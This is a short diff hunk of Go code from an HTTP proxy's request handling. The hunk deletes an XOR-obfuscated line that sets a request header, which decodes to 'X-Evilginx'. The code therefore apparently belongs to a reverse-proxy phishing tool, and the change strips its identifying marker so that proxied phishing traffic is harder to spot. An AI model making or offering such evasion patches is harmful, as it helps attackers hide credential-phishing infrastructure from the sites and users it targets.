@@ -610,11 +610,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
                     }
                 }
-                e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
-                for n, b := range e {
-                    e[n] = b ^ 0x88
-                }
-                req.Header.Set(string(e), e_host)
 
                 if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
                     s, ok := p.sessions[ps.SessionId]
